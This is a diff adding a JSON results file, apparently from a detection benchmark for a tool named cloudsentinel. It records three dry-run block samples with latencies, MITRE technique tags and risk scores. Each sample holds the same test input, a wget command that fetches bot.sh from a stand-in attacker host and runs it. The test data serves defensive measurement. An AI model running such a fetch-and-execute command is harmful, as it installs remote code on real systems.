@@ -1,0 +1,81 @@
+{
+  "actions": [
+    "dry_run_block",
+    "dry_run_block",
+    "dry_run_block"
+  ],
+  "active": false,
+  "iterations": 3,
+  "median_ms": 0.962,
+  "p95_ms": 1.5,
+  "pass": true,
+  "samples": [
+    {
+      "block_command": "",
+      "block_completed_at": 1779697991.5367436,
+      "block_started_at": 1779697991.5362654,
+      "block_stderr": "",
+      "block_stdout": "",
+      "cloudsentinel_mitre_techniques": [
+        "T1059.004",
+        "T1105",
+        "T1222"
+      ],
+      "cloudsentinel_risk_score": 75,
+      "cloudsentinel_soar_action": "dry_run_block",
+      "country_code": "RU",
+      "detected_at": 1779697991.535244,
+      "eventid": "cloudsentinel.command.input",
+      "input": "wget http://evil.example/bot.sh && chmod 777 bot.sh && bash -c ./bot.sh",
+      "mttb_ms": 1.5,
+      "session": "mttb_0",
+      "src_ip": "8.8.8.8"
+    },
+    {
+      "block_command": "",
+      "block_completed_at": 1779697991.5914774,
+      "block_started_at": 1779697991.5910823,
+      "block_stderr": "",
+      "block_stdout": "",
+      "cloudsentinel_mitre_techniques": [
+        "T1059.004",
+        "T1083",
+        "T1105",
+        "T1222"
+      ],
+      "cloudsentinel_risk_score": 80,
+      "cloudsentinel_soar_action": "dry_run_block",
+      "country_code": "RU",
+      "detected_at": 1779697991.5905461,
+      "eventid": "cloudsentinel.command.input",
+      "input": "wget http://evil.example/bot.sh && chmod 777 bot.sh && bash -c ./bot.sh",
+      "mttb_ms": 0.931,
+      "session": "mttb_1",
+      "src_ip": "8.8.8.8"
+    },
+    {
+      "block_command": "",
+      "block_completed_at": 1779697991.6502771,
+      "block_started_at": 1779697991.6498246,
+      "block_stderr": "",
+      "block_stdout": "",
+      "cloudsentinel_mitre_techniques": [
+        "T1059.004",
+        "T1083",
+        "T1105",
+        "T1222"
+      ],
+      "cloudsentinel_risk_score": 85,
+      "cloudsentinel_soar_action": "dry_run_block",
+      "country_code": "RU",
+      "detected_at": 1779697991.6493149,
+      "eventid": "cloudsentinel.command.input",
+      "input": "wget http://evil.example/bot.sh && chmod 777 bot.sh && bash -c ./bot.sh",
+      "mttb_ms": 0.962,
+      "session": "mttb_2",
+      "src_ip": "8.8.8.8"
+    }
+  ],
+  "source_ip": "8.8.8.8",
+  "target_ms": 100
+}
